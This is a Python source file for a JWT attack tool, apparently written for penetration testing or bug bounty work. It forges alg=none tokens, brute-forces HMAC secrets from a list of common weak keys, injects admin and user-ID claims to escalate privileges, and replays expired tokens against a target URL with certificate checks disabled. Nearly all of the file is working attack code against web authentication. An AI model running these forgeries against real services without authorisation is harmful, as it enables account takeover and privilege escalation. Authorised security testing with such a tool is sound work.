#!/usr/bin/env python3
"""
jwt_analyzer.py — Deep JWT Security Analysis

Beyond detection: algorithm confusion (HS256→none), weak key brute force,
claim tampering, key confusion (RS256→HS256), and expired token reuse.

Usage:
    from jwt_analyzer import JWTAnalyzer
    analyzer = JWTAnalyzer()
    results = analyzer.analyze_token(token_string)
"""
import base64
import hashlib
import hmac
import json
import os
import re
import time
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None

# ── Common weak JWT secrets to test ────────────────────────────────────────────

WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "changeme", "test", "default", "mysecret", "s3cr3t",
    "supersecret", "jwt", "token", "auth", "development",
    "production", "staging", "your-256-bit-secret",
    "your-secret-key", "secret-key", "my-secret-key",
    "HS256-secret", "shhh", "keyboard cat", "gcp-secret",
    "", "null", "undefined", "none",
    "abcdefghijklmnopqrstuvwxyz", "1234567890",
    "AllYourBase", "letmein", "qwerty",
]


class JWTAnalyzer:
    """Deep JWT security tester."""

    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None

    @staticmethod
    def decode_jwt(token: str) -> dict:
        """Decode JWT without verification."""
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "Not a valid JWT (expected 3 parts)"}

        result = {"raw": token, "header": {}, "payload": {},
                  "signature": parts[2]}

        for i, section in enumerate(["header", "payload"]):
            try:
                padded = parts[i] + "=" * (4 - len(parts[i]) % 4)
                decoded = base64.urlsafe_b64decode(padded)
                result[section] = json.loads(decoded)
            except Exception as e:
                result[section] = {"decode_error": str(e)}

        return result

    @staticmethod
    def _base64url_encode(data: bytes) -> str:
        """Base64url encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def forge_none_alg(self, token: str) -> str:
        """Create JWT with alg=none (CVE-2015-9235)."""
        decoded = self.decode_jwt(token)
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})

        header["alg"] = "none"
        header_b64 = self._base64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = self._base64url_encode(
            json.dumps(payload, separators=(",", ":")).encode())

        return f"{header_b64}.{payload_b64}."

    def forge_with_claims(self, token: str,
                          claims: dict, alg: str = "") -> str:
        """Forge JWT with modified claims."""
        decoded = self.decode_jwt(token)
        header = decoded.get("header", {})
        payload = {**decoded.get("payload", {}), **claims}

        if alg:
            header["alg"] = alg

        header_b64 = self._base64url_encode(
            json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = self._base64url_encode(
            json.dumps(payload, separators=(",", ":")).encode())

        # Sign with empty sig for none alg
        if header.get("alg", "").lower() == "none":
            return f"{header_b64}.{payload_b64}."

        return f"{header_b64}.{payload_b64}.{decoded.get('signature', '')}"

    def brute_force_secret(self, token: str,
                           wordlist: list[str] = None) -> dict:
        """Brute force HMAC secret."""
        wordlist = wordlist or WEAK_SECRETS
        decoded = self.decode_jwt(token)
        alg = decoded.get("header", {}).get("alg", "")

        if alg not in ("HS256", "HS384", "HS512"):
            return {"cracked": False, "reason": f"Not HMAC algorithm: {alg}"}

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        target_sig = parts[2]

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }[alg]

        for secret in wordlist:
            sig = hmac.new(
                secret.encode(), signing_input, hash_func).digest()
            sig_b64 = self._base64url_encode(sig)

            if sig_b64 == target_sig:
                return {
                    "cracked": True,
                    "secret": secret,
                    "algorithm": alg,
                    "severity": "CRITICAL",
                }

        return {"cracked": False, "tested": len(wordlist)}

    def test_alg_confusion(self, token: str,
                           url: str = "", headers: dict = None) -> dict:
        """Test algorithm confusion attacks."""
        headers = headers or {}
        result = {
            "type": "ALG_CONFUSION",
            "tests": [],
            "vulnerable": False,
        }

        decoded = self.decode_jwt(token)
        original_alg = decoded.get("header", {}).get("alg", "")

        # Test 1: alg=none
        none_token = self.forge_none_alg(token)
        test = {"alg": "none", "token": none_token[:50] + "..."}

        if url and self.session:
            try:
                test_headers = {**headers, "Authorization": f"Bearer {none_token}"}
                resp = self.session.get(url, headers=test_headers, timeout=8,
                                       verify=False)
                test["status"] = resp.status_code
                if resp.status_code in (200, 201):
                    test["accepted"] = True
                    result["vulnerable"] = True
                    result["severity"] = "CRITICAL"
            except Exception:
                pass

        result["tests"].append(test)

        # Test 2: alg="" (empty)
        empty_token = self.forge_with_claims(token, {}, alg="")
        if url and self.session:
            try:
                test_headers = {**headers, "Authorization": f"Bearer {empty_token}"}
                resp = self.session.get(url, headers=test_headers, timeout=8,
                                       verify=False)
                if resp.status_code in (200, 201):
                    result["tests"].append({
                        "alg": "empty", "accepted": True,
                        "status": resp.status_code})
                    result["vulnerable"] = True
            except Exception:
                pass

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_claim_tampering(self, token: str,
                             url: str = "", headers: dict = None) -> dict:
        """Test if claim modifications are accepted."""
        headers = headers or {}
        result = {
            "type": "CLAIM_TAMPERING",
            "tests": [],
            "vulnerable": False,
        }

        decoded = self.decode_jwt(token)
        payload = decoded.get("payload", {})

        # Privilege escalation claims
        escalation_claims = [
            {"role": "admin"},
            {"admin": True},
            {"is_admin": True},
            {"role": "superadmin"},
            {"groups": ["admin"]},
            {"scope": "admin read write"},
        ]

        # User ID swap (IDOR via JWT)
        if "sub" in payload:
            original_sub = payload["sub"]
            escalation_claims.append({"sub": "1"})
            escalation_claims.append({"sub": "admin"})

        if "user_id" in payload:
            escalation_claims.append({"user_id": 1})

        for claims in escalation_claims:
            forged = self.forge_with_claims(token, claims, alg="none")
            test = {"claims": claims, "token_preview": forged[:50]}

            if url and self.session:
                try:
                    test_headers = {**headers,
                                   "Authorization": f"Bearer {forged}"}
                    resp = self.session.get(url, headers=test_headers,
                                          timeout=8, verify=False)
                    test["status"] = resp.status_code
                    if resp.status_code in (200, 201):
                        test["accepted"] = True
                        result["vulnerable"] = True
                        result["severity"] = "CRITICAL"
                except Exception:
                    pass

            result["tests"].append(test)

        if result["vulnerable"]:
            self.findings.append(result)

        return result

    def test_expired_token(self, token: str,
                           url: str = "", headers: dict = None) -> dict:
        """Test if expired tokens are still accepted."""
        headers = headers or {}
        decoded = self.decode_jwt(token)
        payload = decoded.get("payload", {})
        result = {"type": "EXPIRED_TOKEN", "vulnerable": False}

        exp = payload.get("exp")
        if exp and exp < time.time():
            result["expired"] = True
            result["exp_time"] = exp

            if url and self.session:
                try:
                    test_headers = {**headers,
                                   "Authorization": f"Bearer {token}"}
                    resp = self.session.get(url, headers=test_headers,
                                          timeout=8, verify=False)
                    if resp.status_code in (200, 201):
                        result["vulnerable"] = True
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception:
                    pass

        return result

    def analyze_token(self, token: str, url: str = "",
                      headers: dict = None) -> dict:
        """Full JWT analysis."""
        headers = headers or {}
        decoded = self.decode_jwt(token)

        results = {
            "decoded": decoded,
            "algorithm": decoded.get("header", {}).get("alg", ""),
            "brute_force": self.brute_force_secret(token),
            "alg_confusion": self.test_alg_confusion(token, url, headers),
            "claim_tampering": self.test_claim_tampering(token, url, headers),
            "expired_token": self.test_expired_token(token, url, headers),
            "total_findings": len(self.findings),
        }

        # Security assessment
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})
        issues = []

        if header.get("alg") in ("HS256",):
            issues.append("Uses HS256 — vulnerable to brute force")
        if not payload.get("exp"):
            issues.append("No expiration (exp) claim — token never expires")
        if not payload.get("iss"):
            issues.append("No issuer (iss) claim")
        if payload.get("admin") or payload.get("is_admin"):
            issues.append("Contains admin flag in claims — test tampering")

        results["security_issues"] = issues
        return results

    def find_jwts_in_response(self, text: str) -> list[str]:
        """Extract JWTs from response text."""
        return re.findall(
            r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*', text)

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/jwt")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"jwt_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
